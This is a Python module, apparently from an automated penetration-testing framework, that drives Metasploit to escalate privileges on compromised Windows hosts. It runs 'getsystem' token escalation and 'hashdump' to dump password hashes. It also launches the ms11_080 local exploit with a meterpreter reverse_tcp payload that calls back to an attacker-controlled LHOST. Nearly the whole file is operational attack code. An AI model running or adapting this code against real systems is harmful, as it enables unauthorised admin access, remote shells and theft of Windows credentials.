
import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config

################################################################################
# Envionment variable imports (API Keys etc)
################################################################################

load_dotenv()
# MSF_LHOST = os.getenv('MSF_LHOST')

################################################################################
# Priviledge Escalation commands
################################################################################

class PriviledgeEsc(object):
    """
    Defines a collection priviledge escalation commands and exploits
    """

    def update_priviledes(self, target_name, verbose = True):
        """
        User priviledges from meterpreter
        """
        target = config.TARGETS[target_name]
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # search target priv and update model
        cmd = "getuid"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        if 'AUTHORITY' in msf_reply:
            target.priv = 'admin'
        else:
            target.priv = 'user'
        # background session
        config.MSFCONSOLE.background_session(target_name)

    def tokens(self, target_name, verbose=True):
        """
        Escalate priviledges with meterpreter token methods
        """
        target = config.TARGETS[target_name]
        original_priv = target.priv
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # attempt to escalate privs
        cmd = "getsystem"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        # attempt to update privs
        self.update_priviledes(target_name, verbose)
        if verbose:
            current_priv = target.priv
            if current_priv != original_priv:
                print("[+] priviledge escalation:", original_priv, "=>", current_priv)
                return
            else:
                print("[-] escalation via tokens failed ")
        # background session
        config.MSFCONSOLE.background_session(target_name)

    def exploit_cve_2011_2005(self, target_name, verbose=True):
        """
        Escalate priviledges with ms11_080 exploit
        """
        target = config.TARGETS[target_name]
        original_priv = target.priv
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # setup exploit
        cmd = "use exploit/windows/local/ms11_080_afdjoinleaf"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set SESSION " + target.session_id
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set payload windows/meterpreter/reverse_tcp"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LHOST " + config.MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        # run exploit
        config.MSFCONSOLE.set_active_session()
        cmd = "exploit"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=22)
        # handle result
        for line in msf_reply.splitlines():
            if 'Meterpreter session' in line:
                words = line.split()
                target.session_id = words[3]
                config.MSFCONSOLE.background_session(target_name)
                print("[*] exploit successful, session id:", words[3])
                break
        # update user priviledges
        config.PRIVILEDGEESC.update_priviledes(target_name)

    def hashdump(self, target_name, verbose=True ):
        """
        Display hashed Windows passwords
        """
        target = config.TARGETS[target_name]
        if not config.MSFCONSOLE.shell:
            raise Exception("shell session with target not active")
            return
        cmd = "hashdump"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)





#
